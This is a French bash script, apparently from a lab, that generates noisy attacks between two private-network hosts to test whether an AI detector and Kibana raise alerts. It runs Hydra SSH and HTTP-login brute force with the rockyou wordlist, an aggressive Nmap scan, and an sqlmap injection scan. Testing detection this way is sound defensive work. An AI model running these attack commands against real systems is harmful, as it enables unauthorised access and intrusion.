#!/bin/bash
# ══════════════════════════════════════════════════════════════════
#  Script d'attaques BRUYANTES — détectées par IA ET Kibana
#  Machine attaquante : 192.168.122.114
#  Machine victime    : 192.168.122.37
#
#  Usage : bash 02_attaques_bruyantes.sh
#  Prérequis (attaquant) : hydra, nmap, nikto, sqlmap
# ══════════════════════════════════════════════════════════════════

VICTIME="192.168.122.37"
ATTAQUANT="192.168.122.114"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

echo -e "${RED}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║   ATTAQUES BRUYANTES — IA + Kibana détectent         ║"
echo "║   Attaquant: $ATTAQUANT  →  Victime: $VICTIME  ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ── ATTAQUE 1 : SSH Brute Force massif ──────────────────────────
echo -e "${RED}[ATTAQUE 1]${NC} SSH Brute Force — Hydra"
echo "  → Génère >10 tentatives/min → Kibana ALERT + IA ALERT"
echo "  → Type incident : brute_force | Sévérité attendue : CRITICAL"
echo ""
hydra -l root -P /usr/share/wordlists/rockyou.txt \
      ssh://${VICTIME} \
      -t 4 -w 3 -f \
      -o /tmp/hydra_result.txt \
      2>&1 | tail -5
echo ""

# ── ATTAQUE 2 : Scan de ports agressif ──────────────────────────
echo -e "${RED}[ATTAQUE 2]${NC} Scan de ports Nmap agressif (-A)"
echo "  → Génère des connexions rapides → Rate Detector + Kibana"
echo "  → Type incident : scan | Sévérité attendue : HIGH"
echo ""
nmap -A -T4 -sV --open ${VICTIME} -oN /tmp/nmap_result.txt 2>&1 | tail -5
echo ""

# ── ATTAQUE 3 : Brute Force HTTP login ──────────────────────────
echo -e "${RED}[ATTAQUE 3]${NC} Brute Force HTTP — Application web"
echo "  → Flood de requêtes POST → Apache logs → IA + Kibana"
echo "  → Type incident : web_attack"
echo ""
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      http-post-form://${VICTIME}/login:"username=^USER^&password=^PASS^:F=Invalid" \
      -t 10 -f 2>&1 | tail -3
echo ""

# ── ATTAQUE 4 : SQL Injection scan ──────────────────────────────
echo -e "${RED}[ATTAQUE 4]${NC} SQL Injection — SQLMap"
echo "  → Requêtes HTTP suspectes → Apache logs → web_attack"
echo ""
sqlmap -u "http://${VICTIME}/login?id=1" \
       --batch --level=3 --risk=2 \
       --output-dir=/tmp/sqlmap_out 2>&1 | tail -5
echo ""

echo -e "${GREEN}✓ Attaques bruyantes terminées — vérifier /incidents sur la plateforme${NC}"
